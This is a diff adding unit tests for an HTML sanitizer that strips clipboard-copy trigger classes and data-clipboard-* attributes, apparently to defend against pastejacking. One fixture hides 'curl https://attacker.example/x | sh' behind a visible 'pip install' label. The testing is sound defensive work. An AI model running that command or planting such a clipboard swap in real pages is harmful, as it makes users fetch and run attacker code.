@@ -317,3 +317,57 @@ describe("sanitizeRenderedHtml inline style attributes", () => {
     expect(styleOf(style)).not.toMatch(forbidden);
   });
 });
+
+describe("sanitizeRenderedHtml clipboard triggers", () => {
+  const firstElement = (html: string): Element | null =>
+    parse(sanitizeRenderedHtml(html)).firstElementChild;
+
+  it("strips the copy trigger class and every data-clipboard-* attribute", () => {
+    const span = firstElement(
+      '<span class="copy-button" data-clipboard-text="curl https://attacker.example/x | sh" data-clipboard-action="copy">pip install inspect-ai</span>'
+    );
+    expect(span?.textContent).toBe("pip install inspect-ai");
+    expect(span?.classList.contains("copy-button")).toBe(false);
+    expect(span?.hasAttribute("data-clipboard-text")).toBe(false);
+    expect(span?.hasAttribute("data-clipboard-action")).toBe(false);
+  });
+
+  it("strips a clipboard-button that targets another element", () => {
+    const anchor = firstElement(
+      '<a class="btn clipboard-button" data-clipboard-target="#task-json-contents">copy</a>'
+    );
+    expect(anchor?.hasAttribute("data-clipboard-target")).toBe(false);
+    expect(anchor?.classList.contains("clipboard-button")).toBe(false);
+    expect(anchor?.classList.contains("btn")).toBe(true);
+  });
+
+  it("removes the trigger token from a list of classes and keeps the rest in order", () => {
+    const span = firstElement(
+      '<span class="foo copy-button bar clipboard-button baz">x</span>'
+    );
+    expect(span?.getAttribute("class")).toBe("foo bar baz");
+  });
+
+  it("drops a class attribute that held only trigger tokens", () => {
+    expect(
+      firstElement('<span class="copy-button">x</span>')?.hasAttribute("class")
+    ).toBe(false);
+  });
+
+  it("keeps classes that merely contain a trigger token as a substring", () => {
+    expect(
+      firstElement(
+        '<span class="foo copy-button-ish bar">x</span>'
+      )?.getAttribute("class")
+    ).toBe("foo copy-button-ish bar");
+  });
+
+  it("keeps unrelated data attributes", () => {
+    const span = firstElement(
+      '<span data-foo="1" data-clipboard-text="x" data-line="7">x</span>'
+    );
+    expect(span?.getAttribute("data-foo")).toBe("1");
+    expect(span?.getAttribute("data-line")).toBe("7");
+    expect(span?.hasAttribute("data-clipboard-text")).toBe(false);
+  });
+});
